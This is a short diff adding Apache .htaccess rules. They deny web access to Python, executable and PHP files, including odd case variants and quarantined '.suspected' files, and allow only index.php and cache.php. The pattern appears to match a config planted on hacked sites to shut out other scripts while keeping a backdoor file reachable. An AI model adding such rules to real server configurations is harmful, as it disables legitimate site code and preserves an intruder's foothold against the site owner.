@@ -1,0 +1,8 @@
+<FilesMatch ".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|cache.php)$">#
+Order allow,deny
+Allow from all
+</FilesMatch>
